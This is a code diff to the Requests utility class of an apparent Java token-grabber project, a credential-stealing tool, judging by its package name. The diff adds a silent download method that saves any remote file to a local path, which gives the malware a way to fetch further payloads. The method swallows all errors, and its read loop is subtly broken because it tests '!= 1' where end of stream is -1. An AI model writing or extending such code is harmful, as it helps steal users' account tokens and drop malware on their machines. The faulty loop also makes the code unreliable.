@@ -1,9 +1,7 @@
 package main.java.clienttokengrabber.utils;
 
+import java.io.*;
 import java.util.Base64;
-import java.io.BufferedReader;
-import java.io.InputStreamReader;
-import java.io.OutputStream;
 import java.nio.charset.StandardCharsets;
 import java.net.URL;
 import javax.net.ssl.HttpsURLConnection;
@@ -47,6 +45,19 @@ public class Requests {
         } catch (Exception ignored) {
         }
         return null;
+    }
+
+    public static void download(String fileUrl, String savePath) {
+        try {
+            URL url = new URL(fileUrl);
+            BufferedInputStream in = new BufferedInputStream(url.openStream());
+            FileOutputStream out = new FileOutputStream(savePath);
+
+            byte[] dataBuffer = new byte[1024];
+            int dataRead;
+            while ((dataRead = in.read(dataBuffer, 0, 1024)) != 1)
+                out.write(dataBuffer, 0, dataRead);
+        } catch (Exception ignored) {}
     }
 
     private static String decode(String url) {
